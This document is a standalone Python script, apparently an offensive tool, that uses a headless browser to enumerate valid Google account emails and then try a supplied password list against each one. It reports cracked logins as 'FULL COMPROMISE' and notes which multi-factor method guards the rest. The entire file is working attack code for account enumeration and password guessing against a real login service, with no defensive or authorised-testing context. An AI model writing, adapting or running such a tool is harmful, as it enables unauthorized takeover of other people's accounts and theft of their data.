import sys, time, re
from playwright.sync_api import sync_playwright, TimeoutError

if len(sys.argv) < 3:
    sys.exit("Usage: python3 script.py <usernames.txt> <passwords.txt>")

try:
    emails = open(sys.argv[1]).read().split()
except FileNotFoundError:
    sys.exit(f"[!] File '{sys.argv[1]}' not found.")

try:
    passwords = open(sys.argv[2]).read().split()
except FileNotFoundError:
    sys.exit(f"[!] File '{sys.argv[2]}' not found.")

print(f"[*] Loaded {len(emails)} emails and {len(passwords)} passwords. Starting browser engine...")

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)

    for e in emails:
        context = browser.new_context()
        page = context.new_page()
        try:
            page.goto("https://accounts.google.com/")
            page.fill('input[type="email"]', e)
            page.keyboard.press("Enter")

            try:
                page.wait_for_url(re.compile(r"(rejected|challenge/pwd)"), timeout=6000)

                if "rejected" in page.url:
                    print(f"[-] Invalid user: {e}")
                else:
                    print(f"[+] VALID USER: {e}")
                    found_weak = False

                    for pw in passwords:
                        try:
                            url_before = page.url
                            page.fill('input[type="password"]', pw)
                            page.keyboard.press("Enter")
                            time.sleep(3)

                            url_after = page.url
                            url_changed = url_after != url_before
                            field_gone = not page.locator('input[type="password"]').is_visible()
                            error_shown = page.locator('[data-error-code], [jsname="B34EJ"] [jsslot]').first.is_visible()

                            if not url_changed and not field_gone and error_shown:
                                pass  # Wrong password
                            elif not url_changed and not field_gone and not error_shown:
                                time.sleep(2)
                                if not page.locator('input[type="password"]').is_visible():
                                    mfa_match = re.search(r"challenge/(\w+)", page.url)
                                    if mfa_match and "pwd" not in mfa_match.group(1).lower():
                                        print(f"    [!] WEAK PASSWORD + MFA ACTIVE: {e} / {pw}  [MFA type: {mfa_match.group(1).upper()}]")
                                    else:
                                        print(f"    [!] FULL COMPROMISE (no MFA): {e} / {pw}")
                                    found_weak = True
                                    break
                                url_changed = page.url != url_before
                                if url_changed:
                                    mfa_match = re.search(r"challenge/(\w+)", page.url)
                                    if mfa_match and "pwd" not in mfa_match.group(1).lower():
                                        print(f"    [!] WEAK PASSWORD + MFA ACTIVE: {e} / {pw}  [MFA type: {mfa_match.group(1).upper()}]")
                                    else:
                                        print(f"    [!] FULL COMPROMISE (no MFA): {e} / {pw}")
                                    found_weak = True
                                    break
                            elif not url_changed and field_gone:
                                time.sleep(2)
                                mfa_match = re.search(r"challenge/(\w+)", page.url)
                                if mfa_match and "pwd" not in mfa_match.group(1).lower():
                                    print(f"    [!] WEAK PASSWORD + MFA ACTIVE: {e} / {pw}  [MFA type: {mfa_match.group(1).upper()}]")
                                else:
                                    print(f"    [!] FULL COMPROMISE (no MFA): {e} / {pw}")
                                found_weak = True
                                break
                            else:
                                mfa_match = re.search(r"challenge/(\w+)", url_after)
                                if mfa_match and "pwd" not in mfa_match.group(1).lower():
                                    print(f"    [!] WEAK PASSWORD + MFA ACTIVE: {e} / {pw}  [MFA type: {mfa_match.group(1).upper()}]")
                                else:
                                    print(f"    [!] FULL COMPROMISE (no MFA): {e} / {pw}")
                                found_weak = True
                                break

                        except Exception as ex:
                            print(f"    [!] Error trying password {pw} for {e}: {ex}")
                            break

                    if not found_weak:
                        print(f"[-] No weak password found for {e}")

            except TimeoutError:
                path = f"debug_{e.replace('@','_')}.png"
                page.screenshot(path=path)
                print(f"[?] Unknown/CAPTCHA: {e} ({page.url[:60]}...) — screenshot saved to {path}")

        except Exception as ex:
            print(f"[!] Browser error testing {e}: {ex}")

        context.close()
        time.sleep(5)
